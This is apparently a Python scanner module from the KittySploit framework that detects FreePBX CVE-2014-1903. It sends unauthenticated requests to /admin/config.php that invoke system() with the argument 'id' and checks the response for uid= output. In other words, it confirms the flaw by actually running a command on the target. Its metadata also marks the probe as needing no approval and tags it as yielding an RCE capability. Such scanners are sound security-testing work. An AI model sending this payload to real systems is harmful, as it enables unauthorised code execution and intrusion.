#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""FreePBX admin API handler system() RCE (CVE-2014-1903)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'FreePBX - API handler system() Detection (CVE-2014-1903)',
        'description': (
            'Detects CVE-2014-1903 by calling /admin/config.php handler=api function=system '
            'with args=id and matching uid=.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2014', 'freepbx', 'rce', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'rce', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2014-1903',
        ],
        'cve': 'CVE-2014-1903',
    }

    def run(self):
        tag = self.random_text(6)
        for base in ('', '/freepbx'):
            path = (
                f'{base}/admin/config.php?display={tag}&handler=api&file={tag}'
                f'&module={tag}&function=system&args=id'
            )
            r = self.http_request(method='GET', path=path, allow_redirects=False)
            if r and re.search(r'uid=\d+.*gid=\d+', r.text or ''):
                self.set_info(
                    severity='critical',
                    reason='FreePBX API system() RCE (CVE-2014-1903)',
                    path=f'{base}/admin/config.php',
                )
                return True
        return False
